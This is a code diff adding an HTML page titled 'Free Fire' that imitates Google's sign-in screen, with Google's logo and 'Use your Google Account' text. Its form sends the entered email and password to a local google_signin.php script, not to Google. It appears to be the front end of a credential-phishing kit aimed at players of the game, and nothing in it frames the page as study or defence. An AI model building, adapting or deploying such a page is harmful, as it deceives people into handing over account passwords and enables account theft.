@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="google-signin-scope" content="profile email">
+    <meta name="google-signin-client_id" content="YOUR_CLIENT_ID.apps.googleusercontent.com">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.3/css/all.css" integrity="sha384-SZXxX4whJ79/gErwcOYf+zWLeJdY/qpuqC4cAa9rOGUstPomtqpuNWT9wdPEn2fk"
+        crossorigin="anonymous" />
+    <link rel="stylesheet" href="bootstrap-5.0/css/bootstrap.min.css" />
+    <title>Free Fire</title>
+    <style>
+        .google-form {
+            border-radius: 10px;
+        }
+
+        .label-email,
+        .label-password {
+            position: absolute;
+            bottom: 44px;
+            left: 5px;
+            background: #ffffff;
+            padding: 0 0.25rem;
+            border-radius: .25rem
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container facebook-signin-box py-5">
+        <div class="row d-flex justify-content-center justify-content-center py-5 my-5">
+            <div class="col-4">
+                <form class="google-form border p-5" method="POST" action="google_signin.php">
+                    <div class="form-group d-flex justify-content-center pb-1">
+                        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="google" width="100">
+                    </div>
+                    <h5 class="text-center p-1">Sign In</h5>
+                    <p class="text-center h6 p-1">Use your Google Account</p>
+                    <div class="py-3">
+                        <div class="form-group py-3 position-relative">
+                            <label for="userInput" class="label-email"><small>Email or Phone</small></label>
+                            <input id="userInput" class="form-control" type="email" name="user_email" pattern="+@gmail.com" size="30" required>
+                        </div>
+                        <div class="form-group py-3 position-relative">
+                            <label for="userPass" class="label-password"><small>Password</small></label>
+                            <input id="userPass" class="form-control" type="password" name="user_pass" required>
+                        </div>
+                    </div>
+                    <noscript>
+                        <div class="form-group py-4 text-secondary">
+                            <p>Not your computer? Use Guest mode to sign in privately. <a href="#" class="text-decoration-none">Learn more</a></p>
+                        </div>
+                    </noscript>
+                    <div class="form-group d-flex justify-content-center pt-2">
+                        <button class="btn btn-primary" type="submit">Continue with Google</button>
+                    </div>
+                </form>
+                <div class="d-flex justify-content-end py-3">
+                    <a href="#" class="text-decoration-none px-2 text-secondary">Help</a>
+                    <a href="#" class="text-decoration-none px-2 text-secondary">Privacy</a>
+                    <a href="#" class="text-decoration-none px-2 text-secondary">Terms</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="bootstrap-5.0/js/bootstrap.bundle.js"></script>
+</body>
+
+</html>
